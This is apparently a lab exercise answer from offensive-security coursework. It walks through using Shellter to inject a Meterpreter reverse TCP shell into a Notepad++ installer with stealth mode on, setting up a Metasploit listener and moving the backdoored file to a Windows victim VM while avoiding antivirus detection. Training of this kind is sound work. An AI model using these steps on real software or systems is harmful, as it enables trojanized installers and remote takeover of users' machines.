@@ -1,0 +1,38 @@
+Questions 1
+Use Shellter to inject a Meterpreter reverse shell payload in the Spotify executable, then transfer the binary to your Window 11 client VM #1 and ensure that it is not being detected by the antivirus. After, set up a Meterpreter listener, run the backdoored Spotify installer, and verify that you have obtained an interactive shell. As an additional exercise, attempt to find different executables and inject malicious code into them using Shellter.
+
+Which Shellter option is responsible for restoring the execution flow of the backdoored binary and therefore avoids any unwanted suspicion?
+Stealth Mode
+
+sudo apt install shellter
+sudo apt install wine
+dpkg --add-architecture i386 && apt-get update &&
+apt-get install wine32
+
+# Before We start the Shellter tools, prepare a legit software installer, we will use notepad++ v8.6.5 latest installer
+Get the Notepad++ windows installer and place it to /home/kali/Desktop
+https://notepad-plus-plus.org/downloads/v8.6.5/
+
+shellter
+Choose Operation Mode - Auto/Manual (A/M/H): A
+PE Target: /home/kali/Desktop/npp.8.6.5.x64.exe
+...
+Enable Stealth Mode? (Y/N/H): Y
+Use a listed payload or custom? (L/C/H): L ##For local
+Select payload by index: 1 ##Meterpreter_Reverse_TCP
+SET LHOST: <attacker IP>
+SET LPORT: 443
+sudo chmod 777 npp.8.6.5.x64.exe
+
+msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST tun0
+set LPORT 443
+run
+
+# Tranfer the payload to victim machine
+xfreerdp /u:offsec /p:lab /v:192.168.241.62:3389 /drive:smbfolder,/home/kali/Desktop
+
+# Expecting results
+Antivirus doesn't prompt any error and able to run the malicious "npp.8.6.5.x64.exe" payload and Attacker machine able to access its shell
